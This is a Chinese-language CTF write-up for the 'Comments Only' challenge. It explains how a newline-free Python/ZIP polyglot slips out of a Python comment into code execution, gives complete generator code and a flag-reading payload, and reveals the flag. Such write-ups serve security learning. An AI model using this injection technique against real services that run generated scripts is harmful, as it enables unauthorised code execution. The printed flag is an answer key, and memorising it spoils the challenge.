# Comments Only

## 题目简述

服务读取一行用户输入，删除其中的换行和回车，再把它放进 Python 注释：

```python
comment = input("> ").replace("\n", "").replace("\r", "")

code = f"""print("hello world!")
# This is a comment. Here's another:
# {comment}
print("Thanks for playing!")"""
```

生成的临时文件随后由 Python 3.11 直接执行。常规语法注入会被行首 `#` 吞掉，而 `input()` 又阻止提交真正的下一行；但 CPython 还允许把包含 `__main__.py` 的 ZIP 文件直接作为程序运行，而且 ZIP 前面可以存在自解压式前缀。这使同一文件能够同时被源码解析器视为“只有注释”，又被启动逻辑视为 ZIP 应用。

## 解题过程

需要构造一个没有字节 `0x0a` 或 `0x0d` 的 ZIP：

- 归档内文件名为 `__main__.py`；
- 文件内容直接读取 flag；
- 压缩方法使用 stored，避免压缩流不可控；
- 本地文件头、中央目录和 EOCD 的长度/偏移字段也不能包含换行或回车；
- 在 ZIP 前放一个 `#`，使 payload 单独查看时也是 Python 注释/ZIP polyglot。

官方生成器的核心结构如下：

```python
import struct

payload = b"print(open('/home/ctfuser/flag').read())"
name = b"__main__.py"
prefix = b"#"

local = b"PK\x03\x04"
local += b"\x00\x00" * 2          # version, flags
local += b"\x00\x00"              # stored
local += b"\x00" * 8              # time/date, CRC
local += struct.pack("<I", len(payload)) * 2
local += struct.pack("<H", len(name)) + b"\x00\x00"
local += name + payload

central_offset = len(prefix) + len(local)
central = b"PK\x01\x02"
central += b"\x00\x00" * 4
central += b"\x00" * 8
central += struct.pack("<I", len(payload)) * 2
central += struct.pack("<H", len(name))
central += b"\x00\x00" * 4 + b"\x00\x00\x00\x00"
central += struct.pack("<I", len(prefix))
central += name

eocd = b"PK\x05\x06"
eocd += b"\x00\x00" * 2
eocd += b"\x01\x00" * 2
eocd += struct.pack("<I", len(central))
eocd += struct.pack("<I", central_offset)
eocd += b"\x00\x00"

polyglot = prefix + local + central + eocd
assert b"\n" not in polyglot and b"\r" not in polyglot
open("solution.py", "wb").write(polyglot)
```

把 `solution.py` 的原始字节作为唯一一行输入发送。服务生成的文件中，ZIP 字节仍落在 `# ...` 注释内，因此按普通源码扫描时不会执行注入文本；但是 Python 启动器从文件末尾找到 EOCD 和中央目录，把它当作带前缀的 ZIP 应用，并执行内部 `__main__.py`。

容器中的 payload 输出：

```text
uiuctf{yeehaw_954b4b3814b22c0b4eecd}
```

## 方法总结

- 核心技巧：构造无换行的 Python/ZIP polyglot，利用解释器启动层与源码词法层对同一文件的不同识别方式。
- 识别信号：服务把输入写入临时脚本后调用 `python`，过滤只覆盖源码语法字符，却没有约束生成文件的整体格式。
- 复用要点：验证对象不能只看文本前缀；解释器可能接受目录、ZIP、字节码或其它程序载体。此题还要求逐字节检查 ZIP 头中的长度和偏移，任一 `0x0a`/`0x0d` 都会被单行输入边界截断。
